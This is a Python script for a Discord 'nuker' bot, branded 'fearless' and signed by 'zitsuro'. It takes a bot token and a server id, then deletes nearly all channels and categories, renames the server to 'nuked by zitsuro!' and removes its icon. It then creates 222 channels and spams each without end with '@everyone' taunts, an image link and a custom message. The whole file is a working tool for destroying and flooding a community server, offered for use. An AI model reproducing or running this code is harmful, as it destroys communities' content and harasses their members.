import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import time

print(Fore.LIGHTBLUE_EX +  "zitsuro owni ")
print(Fore.LIGHTRED_EX + '''

                 
                  
                   
                    
                     
          _____               _                               
|  ___|__  __ _ _ __| | ___  ___ _____  ___   _ ____ 
| |_ / _ \/ _` | '__| |/ _ \/ __/ __\ \/ / | | |_  / 
|  _|  __/ (_| | |  | |  __/\__ \__ \>  <| |_| |/ /  
|_|  \___|\__,_|_|  |_|\___||___/___/_/\_\\__, /___| 
                                          |___/                   
                       
                        
                         
                          
                           
                            
                             
                               ''')

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
token = input(Fore.MAGENTA + "discord bot token: ")
guild_id = input("server id: ")
spam_message = input("spam message: ")
new_channels_name = input("new channels name: ")
async def send_message_periodically(channel):
    while True:
        await channel.send("@everyone nuked by zitsuro BAHAHAHA https://cdn.discordapp.com/attachments/1330210190058066191/1439035285684883568/IMG_20251113_174953_274.jpg?ex=69190d8c&is=6917bc0c&hm=8e994e06f2784020bfd571eca90b7758f3e9ca47e4f36cddb6962aef60787bf7&" + spam_message)
        await asyncio.sleep(0)
        print(Fore.GREEN + "spammed:", channel.name)

@bot.event
async def on_ready():
    print(f"fearless is ready as {bot.user}")

    
    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print("server id error")
        return
    
    if guild:
        ignore_channel_name = "zerx SMRDI"

        
        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

    for channel in text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for channel in voice_channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
            print("deleted:", channel.name)
        except:
            pass
    for category in categories:
        try:
            await category.delete()
            await asyncio.sleep(0)
            print("deleted", category.name)
        except:
            pass
    try:
        
        await guild.edit(name="nuked by zitsuro!")
        await print("server name changed")
    except:
        print("name edit error")
    try:
         
        await guild.edit(icon=None)
        await print("server pfp changed")
    except:
        print("pfp edit error")

    channels = []
    for i in range(222):
        channel_name = new_channels_name
        channel = await guild.create_text_channel(channel_name)
        channels.append(channel)
        await asyncio.sleep(0)
        print("created:", channel.name)
        
        bot.loop.create_task(send_message_periodically(channel))

bot.run(token)
